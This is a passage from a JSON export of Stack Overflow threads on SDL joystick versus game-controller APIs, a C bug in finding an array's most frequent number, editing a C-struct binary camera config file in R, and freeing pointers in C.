void(*P)(int)=&amp;f;\n    P(2); // why(*p)(2) is also correct?\n</code></pre>\n"}, {"tags": ["c++", "c", "sdl", "sdl-2", "joystick"], "comments": [{"owner": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 0, "creation_date": 1524664741, "post_id": 50022316, "comment_id": 87064488, "body": "Your description sounds just about right. Joystick is a bit lower level - there are buttons, axes and huts, but it may represent any configuration. Gamepad is much more constrained, with SDL implementation being modeled around xbox gamepad (e.g. borrowing button names from it), but it matches popular gamepad models and even have a database of presets and <a href=\"http://generalarcade.com/gamepadtool/\" rel=\"nofollow noreferrer\">configuration tools</a> to remap some weird gamepads. That way you can make assumptions about axes/buttons, while user can use remapping tool to configure it."}, {"owner": {"reputation": 2245, "user_id": 1016891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7e7a61432aae7dad04bd6fcf446d3c80?s=128&d=identicon&r=PG", "display_name": "tom_mai78101", "link": "https://stackoverflow.com/users/1016891/tom-mai78101"}, "reply_to_user": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 0, "creation_date": 1524665179, "post_id": 50022316, "comment_id": 87064779, "body": "@keltar So, if I were to imagine the SDL implementation like a C++ object-oriented design, <code>SDL_Joystick</code> is the parent class of <code>SDL_GameController</code>?"}, {"owner": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 0, "creation_date": 1524668363, "post_id": 50022316, "comment_id": 87067044, "body": "In a way, yes. It watches for joystick events and generates gamecontroller events from them."}, {"owner": {"reputation": 2245, "user_id": 1016891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7e7a61432aae7dad04bd6fcf446d3c80?s=128&d=identicon&r=PG", "display_name": "tom_mai78101", "link": "https://stackoverflow.com/users/1016891/tom-mai78101"}, "reply_to_user": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 0, "creation_date": 1524669117, "post_id": 50022316, "comment_id": 87067605, "body": "@keltar Thanks. I also found this quote some place else on Google but I lost the link. It said <code>If you use SDL_GameController in a game instead SDL_Joystick, you&#39;ll have the same button mapping on every device you port your game on.</code> Is this true?"}, {"owner": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "edited": false, "score": 1, "creation_date": 1524669431, "post_id": 50022316, "comment_id": 87067822, "body": "Yes and no. SDL have builtin mappings for popular models, but &quot;every device&quot; part is unrealistic. However users themselves can configure their device mapping (and upload it for others to use, if desired) without modifying the game, since remapping files can be loaded via environment variables. So in some sense you can ignore remapping problem, delegating it to end users themselves."}], "answers": [{"tags": [], "owner": {"reputation": 15473, "user_id": 744720, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65030f1bd22dbb4d1e6976cfac08a1c5?s=128&d=identicon&r=PG", "display_name": "keltar", "link": "https://stackoverflow.com/users/744720/keltar"}, "is_accepted": true, "score": 4, "last_activity_date": 1524671210, "creation_date": 1524671210, "answer_id": 50026410, "question_id": 50022316, "link": "https://stackoverflow.com/questions/50022316/what-is-sdl-joystick-and-what-is-sdl-gamecontroller-what-are-the-relationships/50026410#50026410", "title": "What is SDL_Joystick and what is SDL_GameController? What are the relationships between the two?", "body": "<p>First of all, SDL game controllers are the extension of SDL joystics (for the scope of this answer when I say \"controller\" or \"joystick\" I mean SDL's implementation, not hardware device category in general). As <a href=\"https://wiki.libsdl.org/CategoryGameController\" rel=\"nofollow noreferrer\">wiki</a> says,</p>\n\n<blockquote>\n  <p>This category contains functions for handling game controllers and for\n  mapping joysticks to game controller semantics. This is built on top\n  of the existing joystick API.</p>\n  \n  <p>If you are running your game from Steam, the game controller mapping\n  is automatically provided for your game.</p>\n</blockquote>\n\n<p>Internally SDL <a href=\"https://hg.libsdl.org/SDL/file/bc2aba33ae1f/src/joystick/SDL_gamecontroller.c#l346\" rel=\"nofollow noreferrer\">uses</a> joystic events and processes them to produce game controller events according to controller mapping. Hence one may say that joystic is lower level thing while game controller is a generalisation upon joysticks to produce more predictable/compatible (but more constrained) for games that wants gamepad-like input devices.</p>\n\n<p>With game controller, you can program input for just one xbox-like controller thing, and SDL will make user's controller compatible with that (sometimes with the user's help - there are way too many different controllers, we can't possibly expect SDL to have configurations for all of them). Of course if controller is very different (or not controller at all - e.g. fly simpulation sticks, wheels, etc.), that would be problemmatic.</p>\n\n<p>Basically game controller provides xbox-like buttons and axes for user side, freeing application developer from the need to support controller remapping - as remapping is done in SDL itself. For <a href=\"https://hg.libsdl.org/SDL/file/bc2aba33ae1f/src/joystick/SDL_gamecontrollerdb.h\" rel=\"nofollow noreferrer\">some popular controllers</a> SDL already have builtin mappings, and for others user-defined mapping can be loaded via <a href=\"https://wiki.libsdl.org/SDL_HINT_GAMECONTROLLERCONFIG\" rel=\"nofollow noreferrer\">environment variable</a>.</p>\n\n<p>There is also a <a href=\"http://generalarcade.com/gamepadtool/\" rel=\"nofollow noreferrer\">configuration tool</a> that simplifies remapping for end user, including exporting resulting configuration to said environment variable. Steam also have builtin configuration tool, which configuration it (supposedly - I've never used that) exports to SDL - essentially making users themselves responsible for configuring their controllers.</p>\n"}], "owner": {"reputation": 2245, "user_id": 1016891, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7e7a61432aae7dad04bd6fcf446d3c80?s=128&d=identicon&r=PG", "display_name": "tom_mai78101", "link": "https://stackoverflow.com/users/1016891/tom-mai78101"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4143, "favorite_count": 3, "accepted_answer_id": 50026410, "answer_count": 1, "score": 12, "last_activity_date": 1524671210, "creation_date": 1524659139, "last_edit_date": 1524670081, "question_id": 50022316, "link": "https://stackoverflow.com/questions/50022316/what-is-sdl-joystick-and-what-is-sdl-gamecontroller-what-are-the-relationships", "title": "What is SDL_Joystick and what is SDL_GameController? What are the relationships between the two?", "body": "<p>What is the relationship between <code>SDL_Joystick</code> and <code>SDL_GameController</code>?  These are the only things I know of right now:</p>\n\n<ul>\n<li><code>SDL_GameController</code> and related functions are all part of a new API introduced in SDL2.</li>\n<li><code>SDL_GameController</code> and related functions are built on top of the existing <code>SDL_Joystick</code> API.</li>\n<li>(Working Draft) You can obtain an instance of <code>SDL_Joystick</code> by calling on the function <a href=\"https://wiki.libsdl.org/SDL_GameControllerGetJoystick\" rel=\"noreferrer\"><code>SDL_GameControllerGetJoystick()</code></a> and passing in an instance of <code>SDL_GameController</code>.</li>\n<li>(Working Draft) You can obtain an instance of <code>SDL_GameController</code> first by calling on <a href=\"https://wiki.libsdl.org/SDL_JoystickInstanceID\" rel=\"noreferrer\"><code>SDL_JoystickInstanceID()</code></a> and passing in an instance of <code>SDL_Joystick</code>, then pass in the <code>SDL_JoystickID</code> to <a href=\"https://wiki.libsdl.org/SDL_GameControllerFromInstanceID\" rel=\"noreferrer\"><code>SDL_GameControllerFromInstanceID</code></a>.</li>\n</ul>\n\n<p>Even though <code>SDL_Joystick</code> and <code>SDL_GameController</code> are both interchangeable, it seems like <code>SDL_GameController</code> is here to replace and slowly succeed the <code>SDL_Joystick</code>.</p>\n\n<p>Reason is, when polling for <code>SDL_Event</code>, the <code>SDL_Event</code> instance contains both the <code>SDL_Event::jbutton</code> and <code>SDL_Event::cbutton</code> structs, representing the <code>SDL_Joystick</code> buttons and <code>SDL_GameController</code> buttons, respectively. I guess I can use either one, or both, button events for the player controls.</p>\n\n<p>I could be wrong here.</p>\n\n<p>I would like to ask:</p>\n\n<ul>\n<li>What are the differences between <code>SDL_Joystick</code> and <code>SDL_GameController</code>?</li>\n<li><p>Is <code>SDL_Joystick</code> now referring to this controller?</p>\n\n<p><a href=\"https://i.stack.imgur.com/3Oj1at.jpg\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/3Oj1at.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>And the same for <code>SDL_GameController</code>?</p>\n\n<p><a href=\"https://i.stack.imgur.com/YsIwSt.jpg\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/YsIwSt.jpg\" alt=\"enter image description here\"></a></p></li>\n<li><p>What are the advantages/disadvantages of using <code>SDL_Joystick</code> over <code>SDL_GameController</code> (and vice versa)?</p></li>\n</ul>\n"}, {"tags": ["c", "arrays", "frequency"], "comments": [{"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 1, "creation_date": 1524659084, "post_id": 50022264, "comment_id": 87060418, "body": "<code>while(i &lt;= total_numbers) {</code> is an off-by-one, should be <code>&lt;</code>. It&#39;s better to just use a <code>for</code> loop, i.e. <code>for (int i = 0; i &lt; total_numbers; ++i)</code> here."}, {"owner": {"reputation": 2244, "user_id": 5520680, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/C1jQH.png?s=128&g=1", "display_name": "Tom&#39;s", "link": "https://stackoverflow.com/users/5520680/toms"}, "edited": false, "score": 1, "creation_date": 1524659106, "post_id": 50022264, "comment_id": 87060439, "body": "you can just sort the array and then found the biggest consecutive sequence. If you can&#39;t touch the original array, then make a copy."}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1524659155, "post_id": 50022264, "comment_id": 87060479, "body": "You need  to replace <code>freq_amt</code> when you replace <code>freq_num</code>. <code>freq_amt = loop_freq_amt</code>."}, {"owner": {"reputation": 434, "user_id": 9547778, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c69e098ba8f12c4b7879e5b240442055?s=128&d=identicon&r=PG&f=1", "display_name": "Zoey Malkov", "link": "https://stackoverflow.com/users/9547778/zoey-malkov"}, "reply_to_user": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 0, "creation_date": 1524659176, "post_id": 50022264, "comment_id": 87060497, "body": "@unwind total_numbers is the exact amount of numbers entered. It isn&#39;t the array size. Its the exact amount of numbers entered."}, {"owner": {"reputation": 434, "user_id": 9547778, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c69e098ba8f12c4b7879e5b240442055?s=128&d=identicon&r=PG&f=1", "display_name": "Zoey Malkov", "link": "https://stackoverflow.com/users/9547778/zoey-malkov"}, "reply_to_user": {"reputation": 2244, "user_id": 5520680, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/C1jQH.png?s=128&g=1", "display_name": "Tom&#39;s", "link": "https://stackoverflow.com/users/5520680/toms"}, "edited": false, "score": 0, "creation_date": 1524659209, "post_id": 50022264, "comment_id": 87060528, "body": "@Tom&#39;s Sorry, what do you mean?"}, {"owner": {"reputation": 434, "user_id": 9547778, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c69e098ba8f12c4b7879e5b240442055?s=128&d=identicon&r=PG&f=1", "display_name": "Zoey Malkov", "link": "https://stackoverflow.com/users/9547778/zoey-malkov"}, "reply_to_user": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1524659223, "post_id": 50022264, "comment_id": 87060538, "body": "@KlasLindb&#228;ck That is what I am doing?"}, {"owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "edited": false, "score": 0, "creation_date": 1524659537, "post_id": 50022264, "comment_id": 87060759, "body": "@ZoeyMalkov I wrote it up as an answer."}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 0, "creation_date": 1524664829, "post_id": 50022264, "comment_id": 87064543, "body": "@ZoeyMalkov That doesn&#39;t matter, 0 through <code>total_numbers</code> inclusive is still one too many, even if there&#39;s space after. Consider how many elements the code would inspect for <code>total_numbers == 0</code>."}], "answers": [{"tags": [], "owner": {"reputation": 41, "user_id": 8182560, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9rjZb.png?s=128&g=1", "display_name": "tmagnier", "link": "https://stackoverflow.com/users/8182560/tmagnier"}, "is_accepted": false, "score": 0, "last_activity_date": 1524659367, "creation_date": 1524659367, "answer_id": 50022407, "question_id": 50022264, "link": "https://stackoverflow.com/questions/50022264/finding-the-most-frequent-number-in-an-array/50022407#50022407", "title": "Finding the most frequent number in an array", "body": "<p>You forgot to update freq_amt.</p>\n\n<p>An other solution is to create an accumulator (array with size of the max number) and in the first loop you increment the accumulator of the current number </p>\n\n<p>And in the second loop find the value of the accumulator corresponding to the more freq number.</p>\n"}, {"tags": [], "owner": {"reputation": 32098, "user_id": 646887, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YJ0Ye.jpg?s=128&g=1", "display_name": "Klas Lindb&#228;ck", "link": "https://stackoverflow.com/users/646887/klas-lindb%c3%a4ck"}, "is_accepted": false, "score": 1, "last_activity_date": 1524659380, "creation_date": 1524659380, "answer_id": 50022409, "question_id": 50022264, "link": "https://stackoverflow.com/questions/50022264/finding-the-most-frequent-number-in-an-array/50022409#50022409", "title": "Finding the most frequent number in an array", "body": "<p>You forgot to set <code>freq_amt</code>, so it is always 0. Every number seems more frequent than that, so you will get the last number instead of the most frequent one..</p>\n\n<pre><code>    if(loop_freq_amt &gt; freq_amt) {\n        freq_num = loop_freq_num;\n        freq_amt = loop_freq_amt; // Added\n    }\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2244, "user_id": 5520680, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/C1jQH.png?s=128&g=1", "display_name": "Tom&#39;s", "link": "https://stackoverflow.com/users/5520680/toms"}, "is_accepted": true, "score": 1, "last_activity_date": 1524660339, "last_edit_date": 1524660339, "creation_date": 1524659536, "answer_id": 50022474, "question_id": 50022264, "link": "https://stackoverflow.com/questions/50022264/finding-the-most-frequent-number-in-an-array/50022474#50022474", "title": "Finding the most frequent number in an array", "body": "<p>You have some little error in your code.</p>\n\n<ol>\n<li>You have \"total_number\" number in your array, so your loop need to go from 0 to total_number&nbsp;-&nbsp;1.</li>\n<li>You forgot to update freq_amt when you have a new max frequencies number.</li>\n</ol>\n\n<p>After, some coding style advice : when looping an array, use a for loop with inner iterator declaration. The variable loop_fre_num is useless.</p>\n\n<pre><code>int most_freq(int num_array[], size_t total_numbers)\n{\n    int freq_num = 0;\n    int freq_amt = 0;\n\n    for (size_t i = 0; i &lt; total_numbers; ++i) {\n        int loop_freq_amt = 0;\n\n        for (size_t j = 0; j &lt; total_numbers; ++j) {\n            if (num_array[i] == num_array[j]) {\n                ++loop_freq_amt;\n            }\n        }\n\n        if(loop_freq_amt &gt; freq_amt) {\n            freq_num = num_array[i];\n            freq_amt = loop_freq_amt;\n        }\n    }\n    return freq_num;\n}\n</code></pre>\n\n<hr>\n\n<p>About the \"copy, sort and find the longuest sequence\", here is an implementation :</p>\n\n<pre><code>int qsort_comp_int(const void *elem1, const void *elem2)\n{\n    return (*(int *)(elem1) - *(int *)(elem2));\n}\n\n\nint most_freq(int num_array[], size_t total_numbers)\n{\n    int    *copy            = NULL;\n    size_t copyByteSize     = sizeof(*copy) * total_numbers;\n    int    freq_num         = num_array[0];\n    int    freq_max_amt     = 0;\n    int    freq_current_amt = 0;\n\n    copy = malloc(copyByteSize);\n\n    memcpy(copy, num_array, copyByteSize);\n\n    qsort(copy, total_numbers, sizeof(*copy), qsort_comp_int);\n\n\n    for (size_t i = 0; i &lt; total_numbers; ++i) {\n        if (i != 0 &amp;&amp; copy[i] != copy[i - 1]) {\n            if (freq_max_amt &lt; freq_current_amt) {\n                freq_num = copy[i - 1];\n                freq_max_amt = freq_current_amt;\n            }\n            freq_current_amt = 0;\n        } else {\n            ++freq_current_amt;\n        }\n    }\n\n    free(copy);\n    return (freq_num);\n}\n\nint main (void)\n{\n    int array[] = {1, 2, 3, 4, 1, 1, 1, 0, 4, 10, 3};\n\n    printf(\"'%d'\\n\", most_freq(array, sizeof(array)/sizeof(*array)));\n\n}\n</code></pre>\n"}], "owner": {"reputation": 434, "user_id": 9547778, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c69e098ba8f12c4b7879e5b240442055?s=128&d=identicon&r=PG&f=1", "display_name": "Zoey Malkov", "link": "https://stackoverflow.com/users/9547778/zoey-malkov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 135, "favorite_count": 0, "accepted_answer_id": 50022474, "answer_count": 3, "score": -1, "last_activity_date": 1524666449, "creation_date": 1524658984, "last_edit_date": 1524666449, "question_id": 50022264, "link": "https://stackoverflow.com/questions/50022264/finding-the-most-frequent-number-in-an-array", "title": "Finding the most frequent number in an array", "body": "<p>I'm trying to see which number occurs the most in an array. I wrote this code, but its not outputting the correct numbers. Could someone tell me where I am going wrong</p>\n\n<p>My logic:</p>\n\n<ol>\n<li>It goes through the array to find numbers that are the same to\nitself. Then it adds +1 to each time it finds a number that is the\nsame to itself (loop_freq_amt).</li>\n<li>Then after it finishes the array it sees if the loop_freq_amt (the number's frequency it just checked) is greater than the current number which as the most frequency (freq_amt). If it is greater, then the freq_num gets replaced.</li>\n</ol>\n\n<hr>\n\n<pre><code>int frequency_number (int array[]) {\nint freq_num = 0;\n\nint i = 0;\nint j = 0;\nwhile(i &lt; ARRAY_SIZE) {\n    if (array[i] == array[j]) {\n        freq_calcualtor = (freq_number);\n    }\n\nreturn freq_num;\n}\n</code></pre>\n"}, {"tags": ["c", "r", "shiny", "binaryfiles"], "comments": [{"owner": {"reputation": 21821, "user_id": 3987294, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a4751b219bec937f1c58a18de85dcd06?s=128&d=identicon&r=PG&f=1", "display_name": "nicola", "link": "https://stackoverflow.com/users/3987294/nicola"}, "edited": false, "score": 0, "creation_date": 1524659216, "post_id": 50022155, "comment_id": 87060534, "body": "First, open a read-binary connection to the file with <code>file</code>: <code>con&lt;-file(&quot;path&#47;to&#47;file&quot;,open=&quot;rb&quot;)</code>; then see <code>?readBin</code> to read values from it. Pay attention to the <code>size</code> argument: R deals only with 4-bytes integer and 8-bytes doubles. So, you have to specify the size for each value you read. For instance, the first value is read with <code>readBin(con,&quot;integer&quot;, n=1, size=1)</code>. Once you read the values, you can modify them with R."}, {"owner": {"reputation": 339, "user_id": 3345186, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c996b73d569f5cb606c5e7dd2ea4510c?s=128&d=identicon&r=PG&f=1", "display_name": "Ross", "link": "https://stackoverflow.com/users/3345186/ross"}, "reply_to_user": {"reputation": 21821, "user_id": 3987294, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a4751b219bec937f1c58a18de85dcd06?s=128&d=identicon&r=PG&f=1", "display_name": "nicola", "link": "https://stackoverflow.com/users/3987294/nicola"}, "edited": false, "score": 0, "creation_date": 1524659918, "post_id": 50022155, "comment_id": 87061087, "body": "Thanks, @nicola. I forgot to mention the following: int8 = one byte; int16 = two bytes; int32 = four bytes ; float = four bytes. Is this an issue if R only deals with 4-byte integers? I actually have been doing exactly what you suggest in your comment (i.e., make the connection, then read value by value), but as I work through the values, I start to get strange results, which make me think I&#39;m not mapping the file correctly. Or perhaps I&#39;m getting confused with the padding structure?"}], "owner": {"reputation": 339, "user_id": 3345186, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/c996b73d569f5cb606c5e7dd2ea4510c?s=128&d=identicon&r=PG&f=1", "display_name": "Ross", "link": "https://stackoverflow.com/users/3345186/ross"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 127, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1524658650, "creation_date": 1524658650, "question_id": 50022155, "link": "https://stackoverflow.com/questions/50022155/edit-binary-file-using-r", "title": "Edit binary file using R", "body": "<p>I need to edit an existing binary file using R, the binary file can be downloaded here: <a href=\"https://www.dropbox.com/s/1a4mb6pj5heju4t/CAMTRAP.CTC?dl=0\" rel=\"nofollow noreferrer\">https://www.dropbox.com/s/1a4mb6pj5heju4t/CAMTRAP.CTC?dl=0</a>.</p>\n\n<p>The original file was written in C, with the following structure:</p>\n\n<pre><code>typedef struct  {\n int8 RTCMonth; // RTC properties used to set camera clock\n int8 RTCDay;\n int8 RTCHour;\n int8 RTCMin;\n int8 RTCSec;\n int16 RTCYear;\n int8 setRTC; // set = 1 to set the RTC using the RTC properties\n int8 softwareVersion[51];\n int16 flashImagesPerTrigger;\n int16 daylightImagesPerTrigger;\n int16 delayBetweenImagesFlash;\n float delayBetweenImagesDaylight;\n int32 imageCounter;\n int8  clearImageCounter; // set = 1 to clear image counter\n int16 SPARE0;\n int8 cameraID[9];\n int8 usbBackupMethod; // 0=FULL, 1=INCREMENTAL, 2=FULL PLUS DELETE\n int16 flashImageBrightness; // 0=NORMAL, 1=BRIGHT, 2=BRIGHTEST\n int8  RESERVED1[32];\n int8  RESERVED2;\n int8 logFileExtention[3];\n int8 SPARE1[3];\n int8 RESERVED3;\n float flashCrossoverCdS; \n int8  setFlashCrossoverCdS; // = 1 to set\n float SPARE3;   \n int8  SPARE4;\n float AspectRatio;    \n int8 setAspectRatio; // = 1 to set\n int8 derivativeClipNormal;  \n int8 setDerivativeClipNormal; // = 1 to set\n int8 purgeLogFile; // = 1 to purge log file\n int8 SPARE5; \n float chargeFlashTarget;   \n int8 setChargeFlashTarget; // = 1 to set\n int8 jpegCompressionRatio; // 12=LOW, 24=MEDIUM, 40=HIGH\n int8 setJpegCompressionRatio; // = 1 to set\n int8 setExifComment; // = 1 to set\n int8 exifComment[50];\n //GPS parms and location data \n int8 setRTCFromGPS; // = 1 to set\n int8  RESERVED4;\n int16 utcOffsetHours; // local UTC time adjustment\n int16 utcOffsetMinutes;\n int8 adjustRtcForDaylightSavings; // set = 1 to enable\n int8 daylightSavingsBeginMonth;\n int8 daylightSavingsBeginDay;\n int8 daylightSavingsEndMonth;\n int8 daylightSavingsEndDay;\n int8 clearGpsData; // set = 1 to clear GpsData\n int32  latitudeRef;\n int32  latitudeDegrees;\n int32  latitudeMinutes;\n int32  latitudeSeconds;\n int32  longitudeRef;\n int32  longitudeDegrees;\n int32  longitudeMinutes; \n int32  longitudeSeconds; \n int8   altitudeRef; \n int32  altFromMSL; \n int8   RESERVED5;\n int8   setGpsLocation;  // = 1 to set\n int8   encryptJpgFiles; // set = 1 to enable\n int8   RESERVED6;\n float  bootLoaderVersion;\n int8   powerLock; // set = 1 to enable\n int8   stealthLedMode; // 0=OFF, 1=No LED indications after initialization, 2=No LED's, extended day, 3=NoLEDs, Extended Day, No Flash Pics\n int8   RESERVED7;\n float RESERVED8;\n float RESERVED9; \n int32 V4SPARE0[2];\n int8  sdCardCleanup; // = 1 to set\n int8  enableTrafficBlocking; // = 1 to set\n int8  V4SPARE[22];\n int8  serverHostname[40];\n int8  serverPort[6];\n int8  networkAPN[40];\n int8  apnUserID[16];\n int8  apnPassword[16];\n int8  apnOperNum[9];\n int8  hardwareTag[10];\n int16 HourForLogUpload; // 0-23 (set &gt; 23 to disable)\n int8  FlashlightMode; // = 1 to set\n int16 MaxDailyImageUploads;\n int8  disableVehicleDetection; // = 1 to set \n int8  disableHumanDetection; // = 1 to set\n int8  initialLEDactiveMinutes;\n int32 RESERVED10;\n int8  synchCameraClockWithServer; // = 1 to set  \n int8  sendImageWithLogFileUpload; // = 1 to set\n int8  RESERVED11[545];\n}SYS_CONFIG; //1024bytes\n</code></pre>\n\n<p>I'm not that familiar with binary files, but according to the author, the members are laid out little endian, following a default member alignment (i.e., there is a padding byte to keep the \"short\" struct member properly aligned on a 2-byte boundary, such that whenever an \"int\" or \"short\" follows a \"char\" a padding byte is inserted to maintain correct alignment).</p>\n\n<p>I'm basically writing a Shiny app that'll allow users to edit their own binary file (which follows the same structure as in the example). Only trouble is I haven't had any luck navigating this binary file. So far I've tried using readBin and writeBin, and although readBin allows me to view certain aspects of the file, I can't seem to figure out the pattern of these data. </p>\n\n<p>I'm not looking for someone to write my code for me, but please can someone assist in explaining how I can use R to edit certain aspects of this particular binary file. For instance, let's say I wanted to change the \"exifComment\" to include some random text. How do I locate that section of the binary file, and then apply and save new data to it? Is this even possible in R?</p>\n\n<p>Thanks in advance! </p>\n\n<p>PS - apologies if I've left out any important info, but this is all I have to work with.</p>\n"}, {"tags": ["c", "pointers", "free"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1524658454, "post_id": 50022005, "comment_id": 87059932, "body": "First of all you allocate the wrong amount of bytes for <code>gameInfo</code>. Then you forget that you don&#39;t allocate memory for <code>gameInfo[i]</code> and try to <code>free</code> that anyway."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1524658564, "post_id": 50022005, "comment_id": 87060031, "body": "I also recommend you look into <i>structure</i> as what you have would be perfect as an array of <i>structures</i> instead of an array of arrays."}, {"owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "edited": false, "score": 0, "creation_date": 1524658607, "post_id": 50022005, "comment_id": 87060065, "body": "Could you explain what I&#39;m doing wrong when allocation the memory? As for the second point, as I said in the last paragraph, if I remove the for (therefore not freeing the arrays) it still gives the same error. Thank you"}, {"owner": {"reputation": 45685, "user_id": 69809, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/yCVF0.jpg?s=128&g=1", "display_name": "Groo", "link": "https://stackoverflow.com/users/69809/groo"}, "edited": false, "score": 0, "creation_date": 1524658671, "post_id": 50022005, "comment_id": 87060107, "body": "@BrunoTeixeira: <code>memset</code> does not allocate memory. You allocated memory for <code>size</code> pointers to arrays of 2 <code>int</code>s. Now you have a bunch of pointers to pairs of slots for storing pointers to arrays, ok? So, the problem is that these slots point to nothing."}, {"owner": {"reputation": 113, "user_id": 3542878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bNHYa.jpg?s=128&g=1", "display_name": "Bruno Teixeira", "link": "https://stackoverflow.com/users/3542878/bruno-teixeira"}, "reply_to_user": {"reputation": 17170, "user_id": 1671066, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/bd4c9461f2d17a884fba66eeed20e320?s=128&d=identicon&r=PG", "display_name": "Micha Wiedenmann", "link": "https://stackoverflow.com/users/1671066/micha-wiedenmann"}, "edited": false, "score": 0, "creation_date": 1524658724, "post_id": 50022005, "comment_id": 87060141, "body": "@MichaWiedenmann Of course, would appreciate any suggestion. This seemed to be the most simple, but if structure (as pointed by Some programmer  dude) is a better option I could definitely do it."}, {"owner": {"reputation": 550, "user_id": 7719205, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lJjRz.jpg?s=128&g=1", "display_name": "Anand Choudhary", "link": "https://stackoverflow.com/users/7719205/anand-choudhary"}, "edited": false, "score": 0, "creation_date": 1524658753, "post_id": 50022005, "comment_id": 87060163, "body": "@BrunoTeixeira check out here <a href=\"https://stackoverflow.com/questions/8102403/when-to-free-pointer-in-c-and-how-to-know-if-it-is-freed\" title=\"when to free pointer in c and 